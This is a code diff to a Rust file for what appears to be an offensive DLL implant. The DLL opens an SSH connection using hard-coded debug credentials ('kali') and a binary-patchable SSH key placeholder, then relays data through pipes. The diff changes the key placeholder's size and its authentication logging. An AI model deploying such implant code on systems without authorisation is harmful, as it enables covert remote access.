@@ -31,25 +31,7 @@ pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
 #[cfg(debug_assertions)]
 pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 
-const fn initialize_ssh_key_array() -> [u8; 513] {
-    let mut key_array = [0u8; 513]; // Initialize the array with null bytes
-
-    // Your original prefix string
-    let prefix = b"SSH_KEY_NO_CHANGE_PLS\0"; // This is 23 bytes long
-
-    // Copy the prefix into the beginning of the array
-    let mut i = 0;
-    while i < prefix.len() {
-        if i < key_array.len() { // Ensure we don't write out of bounds
-            key_array[i] = prefix[i];
-        }
-        i += 1;
-    }
-    // The rest of key_array remains filled with the initial 0u8 values (null bytes)
-    key_array
-}
-
-pub static SSH_KEY: &[u8; 513] = &initialize_ssh_key_array();
+pub static SSH_KEY: &[u8; 1707] = b"SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_";
 
 const SSH_PORT: u16 = 22;
 
@@ -96,11 +78,13 @@ pub fn dll_main() {
         sess.userauth_pubkey_memory(username.as_str(), None, &*ssh_key, None ).unwrap();
     }else{
         sess.userauth_password(&*username, &*password).unwrap();
-        if sess.authenticated() {
-            write_output(h_output_pipe, format!("Authenticated user {}.\n", username).as_str());
-        }
     }
 
+    if sess.authenticated() {
+        write_output(h_output_pipe, format!("Authenticated user {}.\n", username).as_str());
+    }else{
+        write_output(h_output_pipe, format!("FAILED authenticating user {}.\n", username).as_str());
+    }
 
     let h_input_pipe = match initialize_input_pipe() {
         None => return,
